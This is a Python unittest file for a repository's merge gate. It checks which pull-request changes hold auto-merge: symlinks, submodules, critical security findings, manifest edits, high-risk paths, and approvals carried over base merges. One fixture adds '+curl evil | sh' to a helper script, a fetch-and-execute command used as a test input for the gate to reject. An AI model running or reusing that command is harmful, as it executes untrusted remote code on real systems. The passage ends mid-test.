"""The gate's risk hold enable-auto-merge reads (`lane_risk_refusal`).

Expected values come from the gate's own scoring rules in babysit_risk.py,
which native auto-merge would otherwise skip: only a regular file that stays
regular may rate below HIGH (`_mode_problems`), so a symlink or a submodule
pointer holds; the security lane's open CRITICAL findings hold
(`security-finding`); a lane whose evidence is not bound to the head holds;
claude-review's open findings are reported only; and a plain documentation
change by the lane merges. A read that fails holds. With the HIGH path floor
on, as this repository's pr-pipeline.yaml sets it, a manifest change the
gate reviews holds (`manifest-review-required`, the classes #9280 set) and a
plugin.json userConfig default does not (#9483); native auto-merge has no
manifest hold path of its own, so this is the check that holds it.
"""

from __future__ import annotations

import contextlib
import dataclasses
import io
import json
import pathlib
import sys
import unittest
from unittest import mock

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

import babysit_merge  # noqa: E402
import babysit_merge_policy as policy  # noqa: E402
import babysit_verify_evidence as ve  # noqa: E402
from babysit_risk import ChangedFile, LaneEvidence  # noqa: E402

REPO = "example-org/example-repo"
HEAD = "a" * 40
BASE = "b" * 40
PR = {
    "number": 41,
    "head": {"sha": HEAD, "ref": "feat/x"},
    "base": {"sha": BASE, "repo": {"private": False}},
}
# Path holds on: these tests read what lifts one.
# This repository's rows, which the floor paths below sit on.
FLOOR_ROWS = policy.floor_paths_in(
    (pathlib.Path(__file__).resolve().parents[6] / "docs/conventions/pr-pipeline.yaml").read_text(encoding="utf-8")
)
CONFIG = policy.PipelineConfig(
    "c" * 40, "C2", "pr-merge", "agent-lanes[bot]", None, (), "c2-mechanical",
    path_holds=True,
    floor_paths=FLOOR_ROWS,
)  # fmt: skip
DOC = ChangedFile(
    "docs/guide.md",
    None,
    "modified",
    1,
    1,
    True,
    "100644",
    "100644",
    patch="@@ -1 +1 @@\n-old\n+new",
)
FLOOR_ON = dataclasses.replace(CONFIG, high_path_floor=True)
PLUGIN = "plugins/foo/.claude-plugin/plugin.json"
PLUGIN_BASE = (
    '{"name": "foo", "version": "1.0.0",'
    ' "userConfig": {"guard_enabled": {"type": "boolean", "default": true}}}'
)


def manifest(after: str) -> ChangedFile:
    return ChangedFile(
        PLUGIN,
        None,
        "modified",
        1,
        1,
        True,
        "100644",
        "100644",
        patch="@@ -1 +1 @@\n-a\n+b",
        contents=(PLUGIN_BASE, after),
    )


SYMLINK = ChangedFile("docs/link", None, "added", 1, 0, True, "120000", "000000")
SUBMODULE = ChangedFile("vendor/lib", None, "modified", 1, 1, False, "160000", "160000")


def lanes(
    *, code: int = 0, critical: int = 0, bound: bool = True
) -> tuple[LaneEvidence, ...]:
    return (
        LaneEvidence("claude-review", True, None, code),
        LaneEvidence(
            "claude-security-review",
            bound,
            None if bound else "marker-missing",
            critical if bound else None,
            False,
            critical if bound else None,
        ),
    )


def refusal(
    files: tuple[ChangedFile, ...] = (DOC,),
    evidence: object = None,
    config: policy.PipelineConfig = CONFIG,
) -> str | None:
    held = held_by(files, evidence, config)
    return None if held is None else held[0]


def held_by(
    files: tuple[ChangedFile, ...] = (DOC,),
    evidence: object = None,
    config: policy.PipelineConfig = CONFIG,
    reviews: object = (),
    humans: frozenset[int] = frozenset(),
) -> tuple[str, bool] | None:
    held = scored(files, evidence, config, reviews, humans)
    return None if held is None else held[:2]


def scored(
    files: tuple[ChangedFile, ...] = (DOC,),
    evidence: object = None,
    config: policy.PipelineConfig = CONFIG,
    reviews: object = (),
    humans: frozenset[int] = frozenset(),
) -> tuple[str, bool, bool] | None:
    evidence = lanes() if evidence is None else evidence
    effect = evidence if isinstance(evidence, Exception) else None
    read = reviews if isinstance(reviews, Exception) else None
    with (
        mock.patch.object(
            ve,
            "fetch_paginated_api",
            side_effect=read,
            return_value=None if read else list(reviews),
        ),
        mock.patch.object(policy, "changed_files", return_value=(files, True)),
        mock.patch.object(policy, "with_contents", side_effect=lambda repo, pr, f: f),
        mock.patch.object(policy, "pulumi_dirs_at", return_value=()),
        mock.patch.object(policy, "permission_reader", return_value=lambda login: None),
        mock.patch.object(policy, "cost_decision", return_value=None),
        mock.patch.object(
            babysit_merge,
            "_lane_evidence",
            side_effect=effect,
            return_value=None if effect else (evidence, []),
        ),
    ):
        return ve.lane_risk_refusal(REPO, 41, PR, config, 7, humans=lambda: humans)


# A path on the floor (`Floor.high`), held as `high-path:` until a
# trusted person approves the head, as ci-status lifts it (merge-holds.mjs
# pathLifters). Kyle (id 5) is trusted, id 9 is not.
FLOORED = dataclasses.replace(DOC, path=".github/actions/resolve-config/resolve.mjs")
COST = dataclasses.replace(DOC, path="infra/main.tf")
TRUSTED = frozenset({5})


def review(
    state: str, *, user: int = 5, sha: str = HEAD, at: str = "2026-10-26T16:41:00Z"
) -> dict[str, object]:
    return {
        "user": {"id": user, "login": f"user{user}", "type": "User"},
        "state": state,
        "commit_id": sha,
        "submitted_at": at,
    }


class ATrustedApprovalLiftsAHighPath(unittest.TestCase):
    def test_a_floor_path_approved_at_the_head_holds_nothing(self) -> None:
        self.assertIsNone(
            held_by((DOC, FLOORED), reviews=[review("APPROVED")], humans=TRUSTED)
        )

    def test_a_floor_path_holds_without_that_approval(self) -> None:
        # A high path is not a person's (owner decision 2026-10-30, #11020).
        later = "2026-10-26T17:20:00Z"
        cases = {
            "no review": [],
            "an older head": [review("APPROVED", sha="c" * 40)],
            "an untrusted approver": [review("APPROVED", user=9)],
            "changes requested since": [
                review("APPROVED"),
                review("CHANGES_REQUESTED", at=later),
            ],
            "the review list did not read": RuntimeError("reviews: HTTP 502"),
        }
        for name, reviews in cases.items():
            with self.subTest(name):
                held = held_by((DOC, FLOORED), reviews=reviews, humans=TRUSTED)
                self.assertEqual(
                    held,
                    (
                        "high-path:.github/actions/resolve-config/**: "
                        ".github/actions/resolve-config/resolve.mjs",
                        False,
                    ),
                )
        # The trusted list that did not read lifts nothing either.
        self.assertIsNotNone(held_by((DOC, FLOORED), reviews=[review("APPROVED")]))

    def test_the_approval_lifts_no_unsafe_path_or_cost_hold(self) -> None:
        approved = [review("APPROVED")]
        unsafe = held_by((FLOORED, SYMLINK), reviews=approved, humans=TRUSTED)
        cost = held_by((FLOORED, COST), reviews=approved, humans=TRUSTED)
        self.assertEqual(unsafe and unsafe[0].split(":", 2)[:2], ["high-path", "**"])
        self.assertNotIn("resolve-config", str(unsafe))
        self.assertEqual(str(cost and cost[0]).split(":")[0], "cost-review-required")
        self.assertNotIn("high-path", str(cost))


# An approval of an earlier head carried over base merges (#10224): Kyle
# (id 5) approved OLD, then a lane merged the base into it, so the head is a
# merge whose resolve-config change is the one OLD made.
OLD = "c" * 40
MAIN = "5" * 40
CARRIED_PR = PR | {
    "head": {"sha": HEAD, "ref": "feat/x", "repo": {"full_name": REPO}},
    "base": {"sha": BASE, "ref": "main", "repo": {"private": False}},
}
OTHER = "7" * 40
HELD_PATCH = {
    "filename": FLOORED.path,
    "status": "modified",
    "patch": "@@ -1 +1 @@\n-a\n+b",
}


def approval(state: str = "APPROVED", sha: str = OLD, user: int = 5) -> dict[str, object]:
    return {
        "id": 41,
        "user": {"id": user, "login": f"user{user}", "type": "User"},
        "state": state,
        "commit_id": sha,
        "submitted_at": "2026-10-27T23:26:14Z",
    }


HELPER = {"filename": "scripts/helper.sh", "status": "modified", "patch": "+x"}
# main's tip commit, which its full ref resolves to.
TIP = "3" * 40
# The merge bases of the approved head and of the head with main's tip.
MB_OLD = "1" * 40
MB_HEAD = "2" * 40
BASE_DOC = {"filename": "docs/base.md", "status": "modified", "patch": "+q"}
# #10224's shape: main changed a file the pull request also changes, so the
# net change moved by hunk headers while main's own hunk applies the same.
SHARED = ".github/actions/collect-base-activity/collect-base-activity.test.mjs"
SHARED_OLD = {"filename": SHARED, "status": "modified", "patch": "@@ -93 +93 @@\n+mine"}
SHARED_HEAD = SHARED_OLD | {"patch": "@@ -98 +98 @@\n+mine"}
SHARED_BASE = {"filename": SHARED, "status": "modified", "patch": "@@ -10 +10 @@\n+theirs"}
# GitHub's stale-review dismissal on the base merge's push.
STALE = {
    "event": "review_dismissed",
    "actor": {"login": "lanes[bot]", "type": "Bot"},
    "dismissed_review": {
        "review_id": 41,
        "state": "approved",
        "dismissal_message": None,
        "dismissal_commit_id": HEAD,
    },
}


def tree(*paths: str, flipped: str = "", truncated: bool = False) -> dict[str, object]:
    """A recursive git/trees answer: each path a blob at mode 100644, but
    `flipped` at 100755."""
    return {
        "truncated": truncated,
        "tree": [
            {"path": p, "mode": "100755" if p == flipped else "100644", "type": "blob"}
            for p in paths
        ],
    }


PATHS = (".github/actions/resolve-config/live-config.test.mjs", SHARED, "docs/base.md", "scripts/helper.sh")
# The trees of the head and of its merge base with main's tip.
TREES = {HEAD: tree(*PATHS), MB_HEAD: tree(*PATHS)}


def ranges(
    brought: list[dict[str, object]], based: list[dict[str, object]]
) -> dict[str, object]:
    """The compares OLD...HEAD (what the merges brought) and MB_OLD...MB_HEAD
    (what main changed between the merge bases)."""
    return {
        f"{OLD}...{HEAD}": {
            "status": "ahead",
            "behind_by": 0,
            "files": brought,
            "commits": [{"sha": MAIN}, {"sha": HEAD}],
            "total_commits": 2,
        },
        f"{MB_OLD}...{MB_HEAD}": {
            "status": "ahead",
            "behind_by": 0,
            "files": based,
            "commits": [{"sha": MB_HEAD}],
            "total_commits": 1,
        },
    }


def carried(
    head_files: list[dict[str, object]],
    *,
    old_files: list[dict[str, object]] | None = None,
    reviews: list[dict[str, object]] | None = None,
    head_commits: list[dict[str, object]] | None = None,
    pr: dict[str, object] = CARRIED_PR,
    reads: list[str] | None = None,
    now_head: str = HEAD,
    changed: int | None = None,
    across: dict[str, object] | None = None,
    timeline: list[dict[str, object]] | None = None,
    trees: dict[str, object] | None = None,
    default_branch: str = "main",
    now_repo: str = REPO,
) -> list[str]:
    trees = TREES if trees is None else trees
    across = ranges([BASE_DOC], [BASE_DOC]) if across is None else across
    compares = {
        OLD: {
            "files": [HELD_PATCH] if old_files is None else old_files,
            "merge_base_commit": {"sha": MB_OLD},
            "commits": [{"sha": OLD, "parents": [{"sha": MAIN}]}],
            "total_commits": 1,
        },
        HEAD: {
            "files": head_files,
            "merge_base_commit": {"sha": MB_HEAD},
            "commits": head_commits
            or [
                {"sha": OLD, "parents": [{"sha": MAIN}]},
                {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": MAIN}]},
            ],
            "total_commits": len(head_commits or [0, 0]),
        },
    }

    def get(endpoint: str, env: object = None) -> tuple[int | None, object]:
        if reads is not None:
            reads.append(endpoint)
        if endpoint == f"repos/{REPO}/pulls/{pr['number']}":
            count = len(head_files) if changed is None else changed
            head = {"sha": now_head, "repo": {"full_name": now_repo}}
            return 200, {"head": head, "changed_files": count}
        if endpoint == f"repos/{REPO}":
            return 200, {"full_name": REPO, "default_branch": default_branch}
        if "/git/trees/" in endpoint:
            sha = endpoint.split("/git/trees/")[1].split("?")[0]
            return (200, trees[sha]) if sha in trees else (404, None)
        if endpoint == f"repos/{REPO}/git/ref/heads/main":
            return 200, {"ref": "refs/heads/main", "object": {"sha": TIP}}
        if endpoint.endswith(f"...{TIP}"):
            parent = endpoint.rsplit("/", 1)[1].split("...")[0]
            return 200, {"status": "ahead" if parent == MAIN else "diverged"}
        spec = endpoint.rsplit("/", 1)[1]
        if spec in across:
            return 200, across[spec]
        sha = endpoint.rsplit("...", 1)[1]
        assert endpoint == f"repos/{REPO}/compare/{TIP}...{sha}", endpoint
        return 200, compares[sha]

    def paginated(endpoint: str, label: str, *args: object, **kwargs: object) -> object:
        if reads is not None:
            reads.append(endpoint)
        assert endpoint.startswith(f"repos/{REPO}/issues/{pr['number']}/timeline"), endpoint
        if timeline is None:
            raise policy.PolicyReadError(label)
        return timeline

    with mock.patch.object(policy, "_get", side_effect=get):
        rows = [approval()] if reviews is None else reviews
        if not any(r.get("state") == "DISMISSED" for r in rows):
            return policy.carried_lifters(REPO, pr, rows, TRUSTED, floor=policy.floor_for(FLOOR_ROWS))
        with mock.patch.object(policy, "_paginated", side_effect=paginated):
            return policy.carried_lifters(REPO, pr, rows, TRUSTED, floor=policy.floor_for(FLOOR_ROWS))


class ALiftCarriesOverABaseMerge(unittest.TestCase):
    def test_an_approval_before_a_base_merge_lifts_the_head(self) -> None:
        reads: list[str] = []
        self.assertEqual(carried([HELD_PATCH], reads=reads), ["user5"])
        # The head is re-read, the repository's default branch checked, then
        # the base read once by its full ref; every compare names its tip.
        self.assertEqual(reads[0], f"repos/{REPO}/pulls/{CARRIED_PR['number']}")
        self.assertEqual(reads[1], f"repos/{REPO}")
        self.assertEqual(reads[2], f"repos/{REPO}/git/ref/heads/main")
        self.assertIn(f"repos/{REPO}/compare/{TIP}...{OLD}", reads)
        self.assertFalse(any("compare/main" in r or r.endswith("...main") for r in reads))
        # A non-hold file the approved head changed, unchanged by the merge.
        self.assertEqual(
            carried([HELPER, HELD_PATCH], old_files=[HELD_PATCH, HELPER]), ["user5"]
        )

    def test_a_stale_dismissed_approval_carries(self) -> None:
        """The owner's decision of 2026-10-28 (part a): an approval GitHub
        dismissed as stale on the base merge's push counts through the carry."""
        reads: list[str] = []
        self.assertEqual(
            carried(
                [HELD_PATCH], reviews=[approval("DISMISSED")], timeline=[STALE], reads=reads
            ),
            ["user5"],
        )
        self.assertIn(f"repos/{REPO}/issues/{CARRIED_PR['number']}/timeline?per_page=100", reads)

    def test_a_revoking_dismissal_does_not_carry(self) -> None:
        dismissed = STALE["dismissed_review"]
        cases = {
            "a dismissal with a message": [STALE | {"dismissed_review": dismissed | {"dismissal_message": "stale"}}],
            "a dismissal by a person": [STALE | {"actor": {"login": "user5", "type": "User"}}],
            "a dismissal commit the merges did not push": [STALE | {"dismissed_review": dismissed | {"dismissal_commit_id": OTHER}}],
            "a dismissal of another review": [STALE | {"dismissed_review": dismissed | {"review_id": 42}}],
        }  # fmt: skip
        for name, timeline in cases.items():
            with self.subTest(name):
                self.assertEqual(
                    carried([HELD_PATCH], reviews=[approval("DISMISSED")], timeline=timeline),
                    [],
                )
        # Approve the head, push X, force-push the head back: no range.
        self.assertEqual(
            carried([HELD_PATCH], reviews=[approval("DISMISSED", HEAD)], timeline=[STALE]),
            [],
        )

    def test_10224s_shape_carries_when_the_merges_brought_exactly_mains_changes(
        self,
    ) -> None:
        """The owner's decision of 2026-10-28 (part b)."""
        reads: list[str] = []
        replay = {
            "old_files": [HELD_PATCH, SHARED_OLD],
            "across": ranges([BASE_DOC, SHARED_BASE], [SHARED_BASE, BASE_DOC]),
        }
        self.assertEqual(
            carried([HELD_PATCH, SHARED_HEAD], reads=reads, **replay), ["user5"]
        )
        self.assertIn(f"repos/{REPO}/compare/{OLD}...{HEAD}", reads)
        self.assertIn(f"repos/{REPO}/compare/{MB_OLD}...{MB_HEAD}", reads)
        self.assertEqual(
            carried(
                [HELD_PATCH, SHARED_HEAD],
                reviews=[approval("DISMISSED")],
                timeline=[STALE],
                **replay,
            ),
            ["user5"],
        )
        self.assertIn(f"repos/{REPO}/git/trees/{HEAD}?recursive=1", reads)
        self.assertIn(f"repos/{REPO}/git/trees/{MB_HEAD}?recursive=1", reads)
        # The independent security review of #10671: modes come from the
        # trees, and only a base that is the default branch carries.
        refused = {
            "a merge that also flips a base file's mode": {"trees": {HEAD: tree(*PATHS, flipped="docs/base.md"), MB_HEAD: tree(*PATHS)}},
            "a truncated tree": {"trees": {HEAD: tree(*PATHS), MB_HEAD: tree(*PATHS, truncated=True)}},
            "an unreadable tree": {"trees": {HEAD: tree(*PATHS)}},
            "a base that is not the default branch": {"default_branch": "trunk"},
            "a head re-read in a fork": {"now_repo": "a/fork"},
        }  # fmt: skip
        for name, case in refused.items():
            with self.subTest(name):
                self.assertEqual(carried([HELD_PATCH, SHARED_HEAD], **replay, **case), [])
        self.assertEqual(carried([HELD_PATCH], default_branch="trunk"), [])
        cases = {
            "a merge that also edits a hold path": ranges([BASE_DOC, SHARED_BASE, HELD_PATCH | {"patch": "+evil"}], [BASE_DOC, SHARED_BASE]),
            "a merge that also edits a non-hold file": ranges([BASE_DOC, SHARED_BASE, HELPER], [BASE_DOC, SHARED_BASE]),
            "a base change reverted inside the merge": ranges([SHARED_BASE], [BASE_DOC, SHARED_BASE]),
            "a range of 300 files": ranges(
                [{"filename": f"d/{i}", "status": "added", "patch": "+x"} for i in range(300)],
                [{"filename": f"d/{i}", "status": "added", "patch": "+x"} for i in range(300)],
            ),
        }  # fmt: skip
        for name, across in cases.items():
            with self.subTest(name):
                self.assertEqual(
                    carried(
                        [HELD_PATCH, SHARED_HEAD],
                        old_files=[HELD_PATCH, SHARED_OLD],
                        across=across,
                    ),
                    [],
                )

    def test_no_untrusted_shape_or_unread_input_carries(self) -> None:
        cases = {
            "an evil merge": {
                "head_files": [HELD_PATCH | {"patch": "+evil"}],
                "across": ranges([BASE_DOC, HELD_PATCH | {"patch": "+evil"}], [BASE_DOC]),
            },
            # The re-review of #10596: a merge that rewrites a non-hold file
            # the approved head changed, or adds one the base touched.
            "a merge that rewrites scripts/helper.sh": {
                "old_files": [HELD_PATCH, HELPER],
                "head_files": [HELD_PATCH, HELPER | {"patch": "+curl evil | sh"}],
                "across": ranges(
                    [BASE_DOC, HELPER | {"patch": "+curl evil | sh"}], [BASE_DOC]
                ),
            },
            "a merge that adds a file the base touched, with its own content": {
                "head_files": [
                    HELD_PATCH,
                    {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+evil"},
                ],
                "across": ranges(
                    [
                        BASE_DOC,
                        {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+evil"},
                    ],
                    [
                        BASE_DOC,
                        {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+base"},
                    ],
                ),
            },
            "a merge whose second parent the base does not hold": {
                "head_files": [HELD_PATCH],
                "head_commits": [
                    {"sha": OLD, "parents": [{"sha": MAIN}]},
                    {"sha": OTHER, "parents": [{"sha": MAIN}, {"sha": MAIN}]},
                    {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": OTHER}]},
                ],
            },
            # The third security review of #10596: the head judged moved
            # before the re-read, or the compare is cut short.
            "a head that moved since it was read": {
                "head_files": [HELD_PATCH],
                "now_head": "9" * 40,
            },
            "a compare listing fewer files than the pull request changes": {
                "head_files": [HELD_PATCH],
                "changed": 2,
            },
            "a head in a fork": {
                "head_files": [HELD_PATCH],
                "pr": CARRIED_PR
                | {"head": CARRIED_PR["head"] | {"repo": {"full_name": "a/fork"}}},
            },
            "a head whose repository does not read": {
                "head_files": [HELD_PATCH],
                "pr": CARRIED_PR | {"head": CARRIED_PR["head"] | {"repo": None}},
            },
            # A dismissed approval counts only as GitHub's stale dismissal.
            "a dismissed approval with no dismissal event": {
                "head_files": [HELD_PATCH],
                "reviews": [approval("DISMISSED")],
                "timeline": [],
            },
            "a dismissed approval whose timeline does not read": {
                "head_files": [HELD_PATCH],
                "reviews": [approval("DISMISSED")],
            },
            "no approval": {"head_files": [HELD_PATCH], "reviews": []},
            "an untrusted approval": {
                "head_files": [HELD_PATCH],
                "reviews": [approval(user=77)],
            },
        }
        for name, case in cases.items():
            with self.subTest(name):
                self.assertEqual(carried(**case), [])

    def test_an_unresolved_base_lifts_nothing(self) -> None:
        for answer in ((404, None), (200, {"object": {"sha": "main"}})):
            with self.subTest(answer), mock.patch.object(policy, "_get", return_value=answer):
                self.assertEqual(
                    policy.carried_lifters(REPO, CARRIED_PR, [approval()], TRUSTED, floor=policy.floor_for(FLOOR_ROWS)), []
                )

    def test_a_label_removal_lifts_nothing(self) -> None:
        """The owner's decision on #10596: no issue event, push history or
        tracker config is read, so a label removal cannot lift a hold path."""
        with (
            mock.patch.object(policy, "_paginated", side_effect=AssertionError),
            mock.patch.object(policy, "_file_at", side_effect=AssertionError),
        ):
            self.assertEqual(carried([HELD_PATCH], reviews=[]), [])

    def test_the_risk_hold_reads_the_carried_lift_on_its_high_paths(self) -> None:
        with mock.patch.object(
            policy, "carried_lifters", return_value=["user5"]
        ) as lift:
            self.assertIsNone(held_by((DOC, FLOORED), reviews=[], humans=TRUSTED))
        self.assertEqual(lift.call_args.args[0], REPO)
        # The configured hold paths, for the owner's decision Q10 carry.
        self.assertEqual(len(lift.call_args.args), 5)
        self.assertIsInstance(lift.call_args.args[4], list)
        with mock.patch.object(policy, "carried_lifters", return_value=[]):
            self.assertIsNotNone(held_by((DOC, FLOORED), reviews=[], humans=TRUSTED))


class LaneRiskRefusal(unittest.TestCase):
    def test_a_plain_doc_change_holds_nothing(self) -> None:
        self.assertIsNone(refusal())
        # claude-review's findings are reported, never held.
        self.assertIsNone(refusal(evidence=lanes(code=3)))

    def test_a_symlink_or_a_submodule_pointer_holds(self) -> None:
        for changed in (SYMLINK, SUBMODULE):
            with self.subTest(changed.path):
                held = refusal((DOC, changed))
                self.assertIsNotNone(held)
                self.assertIn(changed.path, str(held))

    def test_a_critical_security_finding_holds(self) -> None:
        self.assertIn(
            "security-finding: 1 open", str(refusal(evidence=lanes(critical=1)))
        )

    def test_an_unbound_security_review_holds(self) -> None:
        self.assertIn(
            "evidence-unbound:claude-security-review",
            str(refusal(evidence=lanes(bound=False))),
        )

    def test_a_manifest_change_the_gate_reviews_holds(self) -> None:
        for key in (
            '"hooks": {}',
            '"mcpServers": {}',
            '"experimental": {"monitors": []}',
        ):
            after = PLUGIN_BASE.replace('"name": "foo",', f'"name": "foo", {key},')
            with self.subTest(key):
                held = refusal((DOC, manifest(after)), config=FLOOR_ON)
                self.assertIn("manifest-review-required", str(held))
                self.assertIn(PLUGIN, str(held))

    def test_a_user_config_default_merges(self) -> None:
        after = PLUGIN_BASE.replace('"default": true', '"default": false')
        self.assertIsNone(refusal((DOC, manifest(after)), config=FLOOR_ON))

    def test_a_failed_read_holds(self) -> None:
        held = refusal(
            evidence=babysit_merge.HeadPusherUnproven("head-pusher-unproven:abc")
        )
        self.assertTrue(str(held).startswith("unreadable: "), held)

    def test_a_failed_read_answers_all_three_fields(self) -> None:
        held = scored(
            evidence=babysit_merge.HeadPusherUnproven("head-pusher-unproven:abc")
        )
        self.assertEqual(len(held), 3, held)
        self.assertEqual(held[1:], (False, False))

    def test_only_a_security_finding_needs_a_person(self) -> None:
        # Owner rule 2026-10-26: unbound review evidence, the manifest review
        # and a failed read go back to the lanes; a CRITICAL finding stays a
        # person's. A symlink or submodule (an unsafe path) holds but is not a
        # person's (owner decision 2026-10-30, #11020).
        after = PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "hooks": {},')
        unproven = babysit_merge.HeadPusherUnproven("head-pusher-unproven:a")
        cases = {
            "critical finding": (held_by(evidence=lanes(critical=1)), True),
            "symlink": (held_by((DOC, SYMLINK)), False),
            "unbound review": (held_by(evidence=lanes(bound=False)), False),
            "manifest": (held_by((DOC, manifest(after)), config=FLOOR_ON), False),
            "failed read": (held_by(evidence=unproven), False),
        }
        for name, (held, person) in cases.items():
            with self.subTest(name):
                self.assertIsNotNone(held)
                self.assertIs(held[1], person, held)


# An enforcement floor path (`Floor.review`) the gate holds as
# `review-path:` until the security review binds clean (owner decision Q26
# option B), as pull request #10908 was held: its security lane bound to the
# head with open findings below CRITICAL that the lanes App resolved, which
# only a clean whole review of the head closes (`whole_review_clears`).
REVIEWED = dataclasses.replace(DOC, path=".github/scripts/pr-unblock/gate-source.mjs")


def security(
    *, total: int, critical: int = 0, clears: bool
) -> tuple[LaneEvidence, ...]:
    return (
        LaneEvidence("claude-review", True, None, 0),
        LaneEvidence("claude-security-review", True, None, total, clears, critical),
    )


class AWholeReviewClearsTheHold(unittest.TestCase):
    def test_a_review_path_hold_a_whole_review_clears_says_so(self) -> None:
        held = scored((DOC, REVIEWED), evidence=security(total=2, clears=True))
        self.assertIsNotNone(held)
        self.assertTrue(str(held[0]).startswith("review-path:"), held)
        self.assertEqual(held[1:], (False, True))

    def test_findings_reported_at_the_head_itself_want_no_whole_review(self) -> None:
        held = scored((DOC, REVIEWED), evidence=security(total=2, clears=False))
        self.assertEqual(held and held[1:], (False, False))

    def test_a_high_path_a_trusted_approval_lifted_leaves_the_request(self) -> None:
        evidence = security(total=2, clears=True)
        lifted = scored(
            (DOC, REVIEWED, FLOORED),
            evidence=evidence,
            reviews=[review("APPROVED")],
            humans=TRUSTED,
        )
        self.assertEqual(lifted and lifted[1:], (False, True))
        held = scored((DOC, REVIEWED, FLOORED), evidence=evidence)
        self.assertEqual(held and held[1:], (False, False))

    def test_another_holding_reason_wants_no_whole_review(self) -> None:
        held = scored((DOC, REVIEWED, SYMLINK), evidence=security(total=2, clears=True))
        self.assertEqual(held and held[1:], (False, False))


class EvidenceCommandReadsTheRisk(unittest.TestCase):
    def cli(
        self,
        evidence: ve.Evidence,
        risk: str | None,
        *,
        head: str = HEAD,
        rung: str | None = "C2",
        person: bool = False,
        whole: bool = False,
    ) -> dict[str, object]:
        out = io.StringIO()
        argv = ["evidence", "--lane-reviews", "--repo", REPO, "--base-sha", BASE]
        argv += ["--rung", rung] if rung is not None else []
        with (
            mock.patch.object(policy, "read_config_at", return_value=CONFIG),
            mock.patch.object(policy, "with_default_branch", return_value=CONFIG),
            mock.patch.object(
                policy, "pull_request", return_value=PR | {"head": {"sha": head}}
            ),
            mock.patch.object(
                ve.Reader, "evidence", lambda self, n, h, pr=None: evidence
            ),
            mock.patch.object(
                ve,
                "lane_risk_refusal",
                return_value=risk and (risk, person, whole),
            ) as read,
            contextlib.redirect_stdout(out),
        ):
            ve.main([*argv, "41", HEAD])
        self.read = read
        return json.loads(out.getvalue())

    def test_a_pass_carries_the_risk_hold_when_the_room_has_a_rung(self) -> None:
        report = self.cli(ve.Evidence(None, HEAD, (), 0), "unsafe-path: docs/link")
        self.assertEqual(
            (report["refusal"], report["reviews"]), (None, "unsafe-path: docs/link")
        )
        self.assertIsNone(self.cli(ve.Evidence(None, HEAD, (), 0), None)["reviews"])

    def test_the_line_says_whether_only_a_person_clears_the_risk_hold(self) -> None:
        passed = ve.Evidence(None, HEAD, (), 0)
        for risk, person in (
            ("security-finding: 1 open", True),
            ("evidence-unbound:claude-review: not bound", False),
            (None, False),
        ):
            with self.subTest(risk):
                report = self.cli(passed, risk, person=person)
                self.assertEqual(
                    (report["reviews"], report["reviewsPerson"]), (risk, person)
                )
        unread = self.cli(passed, None, head="d" * 40)
        self.assertIs(unread["reviewsPerson"], False)

    def test_the_line_says_whether_a_whole_review_clears_the_risk_hold(self) -> None:
        passed = ve.Evidence(None, HEAD, (), 0)
        hold = "review-path:x: x; a clean claude-security-review bound to this head clears it"
        for risk, whole in ((hold, True), (hold, False), (None, False)):
            with self.subTest(risk=risk, whole=whole):
                report = self.cli(passed, risk, whole=whole)
                self.assertIs(report["wholeReviewWanted"], whole)
        self.assertIs(self.cli(passed, None, head="d" * 40)["wholeReviewWanted"], False)

    def test_a_rung_name_from_the_room_scores_as_its_code(self) -> None:
        for rung in ("merge", "merge-reviewed"):
            with self.subTest(rung=rung):
                report = self.cli(
                    ve.Evidence(None, HEAD, (), 0), "unsafe-path: docs/link", rung=rung
                )
                self.assertEqual(report["reviews"], "unsafe-path: docs/link")

    def test_no_rung_from_the_room_holds(self) -> None:
        for rung in (None, "off", "C9"):
            with self.subTest(rung=rung):
                report = self.cli(ve.Evidence(None, HEAD, (), 0), None, rung=rung)
                self.assertTrue(str(report["reviews"]).startswith("unreadable: "))
                self.read.assert_not_called()

    def test_a_refused_verdict_reads_no_risk(self) -> None:
        report = self.cli(ve.Evidence(ve.FAIL, HEAD, (), 0), None)
        self.assertNotIn("reviews", report)
        self.read.assert_not_called()

    def test_a_moved_head_holds(self) -> None:
        report = self.cli(ve.Evidence(None, HEAD, (), 0), None, head="d" * 40)
        self.assertTrue(str(report["reviews"]).startswith("unreadable: the head is"))
        self.read.assert_not_called()


# The gate's hold texts (babysit_merge.unattended_enqueue), written out.
EJECTED = (
    f"queue-ejected:2 failed-check removals from the merge queue at head {HEAD}; "
    "a push resets the count"
)
UNREADABLE_QUEUE = "the merge queue's removals of this head are unreadable"
RUN = "https://github.com/example-org/example-repo/actions/runs/9"


class EvidenceCommandReadsTheQueueEjections(unittest.TestCase):
    """`evidence --lane-queue`: the gate's `merge.max-queue-ejections` cap
    (default 2) on a head the merge queue keeps removing for failed checks,
    which native auto-merge would otherwise re-arm without end."""

    def cli(
        self,
        queue: dict[str, object] | Exception,
        *,
        evidence: ve.Evidence | None = None,
        risk: str | None = None,
        runs: list[str] | Exception | None = None,
    ) -> dict[str, object]:
        out = io.StringIO()
        runs = [RUN] if runs is None else runs
        runs_effect = runs if isinstance(runs, Exception) else None
        argv = ["evidence", "--lane-reviews", "--lane-queue", "--repo", REPO]
        argv += ["--base-sha", BASE, "--rung", "C2", "41", HEAD]
        effect = queue if isinstance(queue, Exception) else None
        with (
            mock.patch.object(policy, "read_config_at", return_value=CONFIG),
            mock.patch.object(policy, "with_default_branch", return_value=CONFIG),
            mock.patch.object(policy, "pull_request", return_value=PR),
            mock.patch.object(
                ve.Reader,
                "evidence",
                lambda self, n, h, pr=None: evidence or ve.Evidence(None, HEAD, (), 0),
            ),
            mock.patch.object(
                ve, "lane_risk_refusal", return_value=risk and (risk, False, False)
            ),
            mock.patch.object(
                babysit_merge,
                "read_merge_queue",
                side_effect=effect,
                return_value=None if effect else queue,
            ) as read,
            mock.patch.object(
                babysit_merge,
                "_failed_merge_group_runs",
                side_effect=runs_effect,
                return_value=None if runs_effect else runs,
            ),
            contextlib.redirect_stdout(out),
        ):
            ve.main(argv)
        self.read = read
        return json.loads(out.getvalue())

    def test_a_head_under_the_cap_carries_its_count_and_no_refusal(self) -> None:
        for count in (0, 1):
            with self.subTest(count=count):
                report = self.cli({"readError": None, "failedEjections": count})
                self.assertEqual(
                    report["queue"],
                    {
                        "failedEjections": count,
                        "limit": 2,
                        "refusal": None,
                        "comment": None,
